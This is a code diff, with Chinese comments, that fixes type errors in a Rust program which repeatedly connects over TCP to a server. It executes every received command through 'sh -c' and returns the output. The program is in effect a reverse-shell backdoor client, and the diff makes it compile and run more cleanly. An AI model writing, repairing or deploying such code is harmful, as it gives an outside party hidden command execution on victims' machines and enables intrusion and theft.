@@ -1,4 +1,5 @@
 use std::{
+    ffi::OsStr,
     io::{Read, Write},
     net::TcpStream,
     process::Command,
@@ -22,7 +23,7 @@ fn main() {
 
     // 主循环，尝试连接服务端
     loop {
-        if let Ok(mut stream) = TcpStream::connect(&server_addr) {  // 注意这里使用引用
+        if let Ok(mut stream) = TcpStream::connect(&server_addr) {
             println!("Connected to server at {}", server_addr);
             handle_connection(&mut stream);
         } else {
@@ -52,7 +53,7 @@ fn handle_connection(stream: &mut TcpStream) {
     loop {
         match stream.read(&mut buffer) {
             Ok(size) if size > 0 => {
-                let command = String::from_utf8_lossy(&buffer[..size]);
+                let command = String::from_utf8_lossy(&buffer[..size]).into_owned();
                 println!("Received command: {}", command);
 
                 // 执行命令并获取输出
@@ -64,7 +65,7 @@ fn handle_connection(stream: &mut TcpStream) {
                 } else {
                     Command::new("sh")
                         .arg("-c")
-                        .arg(&command)  // 这里不需要解引用，因为已经是字符串切片
+                        .arg(command)  // 这里直接使用String，它会自动实现AsRef<OsStr>
                         .output()
                         .expect("Failed to execute command")
                 };
